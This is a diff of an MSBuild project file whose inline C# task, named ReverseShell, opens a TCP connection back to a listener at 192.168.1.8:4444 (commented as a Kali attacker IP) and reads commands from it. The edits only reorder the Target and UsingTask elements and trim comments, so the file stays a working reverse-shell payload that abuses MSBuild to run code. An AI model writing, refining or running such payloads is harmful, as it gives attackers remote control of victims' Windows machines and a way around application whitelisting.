@@ -1,8 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="Connect">
-    <ReverseShell />
-  </Target>
 
+  <!-- Define the UsingTask first so MSBuild recognizes it -->
   <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory"
              AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
@@ -17,8 +16,7 @@ using System.Threading;
 public class ReverseShell : Microsoft.Build.Utilities.Task {
     public override bool Execute() {
         try {
-            // Run in the same thread so MSBuild waits until this returns
-            StartShell();
+            StartShell(); // block here so MSBuild waits
         } catch (Exception ex) {
             SafeLog("Execute exception: " + ex.ToString());
         }
@@ -26,18 +24,16 @@ public class ReverseShell : Microsoft.Build.Utilities.Task {
     }
 
     private void StartShell() {
-        string host = "192.168.1.8"; // <--- set your Kali IP
-        int port = 4444;             // <--- set your listener port
+        string host = "192.168.1.8"; // <-- set your Kali IP
+        int port = 4444;             // <-- set your listener port
 
         try {
             using (TcpClient client = new TcpClient()) {
-                // Try to connect (blocking)
                 client.Connect(host, port);
                 using (NetworkStream stream = client.GetStream()) {
-                    stream.ReadTimeout = 0;  // 0 = infinite
+                    stream.ReadTimeout = 0;
                     stream.WriteTimeout = 0;
 
-                    // Welcome
                     WriteToStream(stream, "=== MSBuild Reverse Shell Connected ===\r\n");
 
                     while (client.Connected) {
@@ -51,7 +47,6 @@ public class ReverseShell : Microsoft.Build.Utilities.Task {
                         try {
                             bytesRead = stream.Read(buffer, 0, buffer.Length);
                         } catch (IOException) {
-                            // network error/read timeout - try again
                             Thread.Sleep(100);
                             continue;
                         }
@@ -112,10 +107,16 @@ public class ReverseShell : Microsoft.Build.Utilities.Task {
         try {
             string path = Path.Combine(Path.GetTempPath(), "msbuild_revshell.log");
             File.AppendAllText(path, DateTime.UtcNow.ToString("o") + " " + text + Environment.NewLine);
-        } catch { /* best-effort logging only */ }
+        } catch { }
     }
 }
       ]]></Code>
     </Task>
   </UsingTask>
+
+  <!-- Targets come after UsingTask -->
+  <Target Name="Connect">
+    <ReverseShell />
+  </Target>
+
 </Project>
